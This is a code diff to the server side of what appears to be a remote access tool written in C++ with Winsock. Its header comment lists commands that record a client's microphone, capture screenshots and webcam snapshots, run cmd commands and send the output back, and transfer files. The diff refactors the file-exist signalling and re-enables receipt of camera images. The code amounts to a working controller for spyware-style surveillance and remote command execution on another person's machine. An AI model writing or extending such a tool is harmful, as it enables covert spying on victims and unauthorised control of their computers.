@@ -1,11 +1,10 @@
 /*
 	Command:	Download <file>: Receive a file from server
-				Mic: Record microphone and send to server
+				Mic <seconds>: Record microphone for <seconds> and send to server
 				Screenshoot: Take a client screenshoot and send to server
 				Camera: Take a client webcam snapshot and send to server
-				Remote <command>: Execute command on client machine
+				Remote <command>: Execute command in cmd and send output to server
 */
-
 
 #include "Header.h"
 
@@ -123,7 +122,7 @@ int main(int argc, char* argv[]) {
 		iResult = send(clientSocket, input.c_str(), input.size(), 0);
 
 		if (iResult > 0) {
-			printf("[OK] Command sent.\n", iResult);
+			printf("[OK] Command sent.\n");
 		}
 		else if (iResult < 0) {
 			printf("[ERROR] send. %d\n", WSAGetLastError());
@@ -154,7 +153,7 @@ int main(int argc, char* argv[]) {
 
 		//Receive client's camera picture.
 		if (command.compare("Camera") == 0) {
-			//receiveFile(FILE_TYPE_CAMERA, clientSocket);
+			receiveFile(FILE_TYPE_CAMERA, clientSocket);
 		}
 
 		if (command.compare("Remote") == 0) {
@@ -221,14 +220,8 @@ void sendFile(const char* fileName, SOCKET clientSocket) {
 	else isExist = TRUE;
 
 	//send file exist signal
-	iResult = send(clientSocket, (char*)&isExist, sizeof(isExist), 0);
-	if (iResult != sizeof(isExist)) {
-		printf("[ERROR] send file exist. %d\n", WSAGetLastError());
-		CloseHandle(file);
-		return;
-	}
 
-	if (isExist) {
+	if (isExist && sendSignal(isExist, clientSocket)) {
 		// send file size
 		fileSize = GetFileSize(file, NULL);
 		iResult = send(clientSocket, (char*)&fileSize, sizeof(fileSize), 0);
@@ -270,11 +263,7 @@ void receiveFile(int fileType, SOCKET clientSocket) {
 	BOOL isExist = FALSE;
 
 	// get file exist signal from client
-	iResult = recv(clientSocket, (char*)&isExist, sizeof(isExist), 0);
-	if (iResult != sizeof(isExist)) {
-		printf("[ERROR] recv. %d\n", WSAGetLastError());
-		return;
-	}
+	isExist = receiveSignal(clientSocket);
 
 	if (isExist) {
 		time_t t = time(0);
@@ -297,7 +286,7 @@ void receiveFile(int fileType, SOCKET clientSocket) {
 		if (fileType == FILE_TYPE_CAMERA) {
 			fileName += "Camera ";
 			fileName += now;
-			fileName += ".jpg";
+			fileName += ".bmp";
 		}
 
 		fileName = regex_replace(fileName, regex(":"), "-");
